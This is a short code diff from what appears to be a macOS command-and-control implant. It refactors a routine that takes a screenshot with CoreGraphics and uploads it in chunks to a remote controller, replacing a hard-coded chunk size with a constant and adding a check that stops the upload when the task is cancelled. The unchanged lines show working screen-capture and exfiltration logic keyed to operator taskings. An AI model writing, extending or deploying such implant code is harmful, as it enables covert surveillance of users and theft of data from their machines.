@@ -14,8 +14,7 @@
                 file_size = CG.CFDataGetLength(sh_data)
 
         if(file_size) > 0:
-            chunk_size = 512000
-            total_chunks = int(file_size / chunk_size) + (file_size % chunk_size > 0)
+            total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)
             data = {
                 "action": "post_response", 
                 "responses": [
@@ -23,16 +22,19 @@
                     "task_id": task_id,
                     "total_chunks": total_chunks,
                     "file_path": str(datetime.now()),
-                    "chunk_size": chunk_size,
+                    "chunk_size": CHUNK_SIZE,
                     "is_screenshot": True 
                 }]
             }
             initial_response = self.postMessageAndRetrieveResponse(data)
             for i in range(0,total_chunks):
+                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
+                    return "Job stopped."
+
                 if i == total_chunks:
-                    content = sh_data[i*chunk_size:]
+                    content = sh_data[i*CHUNK_SIZE:]
                 else:
-                    content = sh_data[i*chunk_size:(i+1)*chunk_size]
+                    content = sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]
                 data = {
                     "action": "post_response", 
                     "responses": [
